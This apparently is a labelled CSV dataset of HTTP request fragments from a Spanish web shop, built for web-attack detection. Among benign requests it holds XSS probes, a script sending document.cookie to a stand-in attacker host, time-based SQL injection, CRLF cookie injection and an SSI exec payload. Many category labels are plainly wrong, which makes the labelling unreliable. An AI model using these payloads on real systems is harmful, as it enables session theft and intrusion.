payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
entrar | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 84m3ri156 | on | Entrar HTTP/1.1,xss,no,92,0,1,0,1,low
"entrar | grimshaw | G//lAc,IAr | on | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium
entrar | grimshaw | 84m3ri156 | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
2 HTTP/1.1,other,no,10,0,0,0,0,high
+ HTTP/1.1,other,no,10,0,0,0,0,high
Credenciales incorrectas HTTP/1.1,other,no,33,0,0,0,0,medium
"insertar | 183','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1",sql,no,76,1,0,0,1,medium
insertar | 183 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 183 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | armand | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,245,0,0,0,1,low
"registro | armand | prusiato | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,239,0,0,0,1,low
"registro | bau*gnon | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,195,0,0,0,1,low
"registro | armand | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,193,0,0,0,1,low
Vaciar carrito| HTTP/1.1,cmd,no,24,0,0,0,1,high
Vaciar carrito HTTP/1.1,other,no,23,0,0,0,0,high
"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Registrar HTTP/1.1",xss,no,307,1,1,0,1,low
"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | %00 | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",cmd,no,167,0,0,0,1,low
"registro | thyagara | fUeRTe | Il,i?dio | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",cmd,no,178,0,0,0,1,low
"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",cmd,no,173,0,0,0,1,low
entrar | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | c69p04e13 | off | Entrar HTTP/1.1,cmd,no,109,0,0,0,1,low
entrar | modestin | es'pec'ia/l | off | Entrar HTTP/1.1,cmd,no,55,1,0,0,1,medium
entrar | modestin | c69p04e13 | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
%3F HTTP/1.1,encoded attack,no,12,0,0,0,0,high
1 HTTP/1.1,other,no,10,0,0,0,0,high
Credenciales incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,encoded attack,no,97,0,0,0,0,low
"""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,35,1,1,0,0,medium
insertar | 1764any%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Pasar por caja HTTP/1.1,cmd,no,89,0,0,0,1,low
insertar | 1764 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1764 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,encoded attack,no,73,0,0,0,0,medium
"entrar | c/?a,ry | 0ara7s5o | on | Entrar HTTP/1.1",cmd,no,50,0,0,0,1,medium
entrar | lucie8 | 0ara7s5o | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
